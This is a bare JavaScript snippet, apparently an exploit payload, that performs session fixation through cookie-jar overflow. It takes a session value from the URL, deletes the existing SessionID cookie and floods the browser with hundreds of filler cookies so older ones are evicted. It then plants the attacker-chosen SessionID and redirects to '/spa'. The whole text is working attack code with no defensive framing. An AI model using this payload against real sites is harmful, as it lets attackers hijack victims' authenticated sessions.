(function() {
    const v = new URLSearchParams(location.search).get('v');
    if (!v) return;

    const attrs = `path=/;expires=Thu, 01 Jan 2030 00:00:00 GMT${location.protocol === 'https:' ? ';secure' : ''}`;

    document.cookie = `SessionID=;${attrs};max-age=0`;

    const currentCount = document.cookie.split(';').filter(c => c.trim()).length;
    const fillCount = Math.max(50, 400 - currentCount);

    for (let i = 0; i < fillCount; i++) {
        document.cookie = `t${i}=1;${attrs}`;
    }

    document.cookie = `SessionID=${encodeURIComponent(v)};${attrs}`;

    setTimeout(() => { window.location.href = '/spa'; }, 250);
})();
